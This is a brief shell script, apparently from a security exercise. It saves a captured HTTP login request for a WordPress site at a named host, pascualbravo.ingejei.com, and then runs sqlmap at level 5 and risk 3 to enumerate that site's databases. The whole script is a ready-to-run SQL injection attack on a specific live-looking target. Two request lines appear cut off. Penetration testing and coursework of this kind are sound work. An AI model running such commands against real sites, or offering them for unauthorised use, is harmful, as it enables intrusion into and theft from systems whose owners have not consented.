printf "POST /wp-login.php HTTP/1.1\nHost: pascualbravo.ingejei.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox>\nContent-Type: application/x-www-form-urlencoded\n\nlog=admin&pwd=abc123&wp-submit=Acceder&redirect_to=https%3A%2F%2Fpascualbrav>\n" > BurpLoginPeticion.txt

# Ejecutar SQLMap con la petición capturada
sqlmap -r BurpLoginPeticion.txt \
--batch --level=5 --risk=3 --dbs \
--output-dir=Historia11reporte_sqlmap


